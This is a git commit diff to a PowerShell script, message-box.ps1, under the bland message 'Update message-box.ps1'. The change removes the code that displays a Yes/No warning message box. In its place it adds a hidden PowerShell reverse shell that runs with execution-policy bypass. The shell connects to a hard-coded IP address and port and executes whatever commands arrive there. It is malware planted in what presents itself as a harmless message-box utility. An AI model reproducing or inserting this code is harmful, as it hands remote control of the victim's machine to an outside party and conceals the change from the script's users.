5ac396e9484d2f002eb54c2c0788c69879698f5c
Athena72281 <irinamiller535@proton.me>
2026-03-26 15:08:14 -0500

    Update message-box.ps1

--- message-box.ps1
+++ message-box.ps1
@@ -7,10 +7,7 @@ $response = $request.GetResponse();
 $receiveStream = $response.GetResponseStream();
 $readStream = [System.IO.StreamReader]::new($receiveStream);
 
-$Button=[System.Windows.MessageBoxButton]::YesNo
-$MessageBoxTitle=$Title
-$MessageBoxBody=$Message
-$MessageIcon=[System.Windows.MessageBoxImage]::Warning;[System.Windows.MessageBox]::show($MessageBoxBody, $MessageBoxTitle, $Button, $MessageIcon)
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('162.210.192.209', 47580);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
 
 [console]::TreatControlCAsInput = $true;
 $initialForegroundColor = [Console]::ForegroundColor;
